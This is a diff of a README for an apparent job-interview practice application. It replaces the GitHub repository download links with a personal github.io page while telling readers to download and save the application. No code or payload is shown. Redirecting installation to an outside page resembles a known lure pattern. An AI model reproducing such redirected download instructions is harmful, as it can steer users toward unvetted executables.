@@ -1,6 +1,6 @@
 # 🚀 prepwise-assessment-interview-practice - Master your next job interview today
 
-[![Download Prepwise](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/shazilh1938/prepwise-assessment-interview-practice)
+[![Download Prepwise](https://img.shields.io/badge/Download-Application-blue.svg)](https://shazilh1938.github.io)
 
 This tool helps job seekers practice for career assessments and interviews. It provides tools for game-based assessments, one-way video interviews, and transcript coaching. Use these resources to prepare for graduate roles and professional positions.
 
@@ -27,7 +27,7 @@ Ensure your computer meets these standards for a smooth experience:
 
 Follow these steps to get the application on your computer.
 
-1. Navigate to the official download page: [https://github.com/shazilh1938/prepwise-assessment-interview-practice](https://github.com/shazilh1938/prepwise-assessment-interview-practice)
+1. Navigate to the official download page: [https://shazilh1938.github.io](https://shazilh1938.github.io)
 2. Locate the link labeled "Download Application" in the top badge or the release section.
 3. Click the link to begin the download.
 4. Save the file to your desktop or your downloads folder.
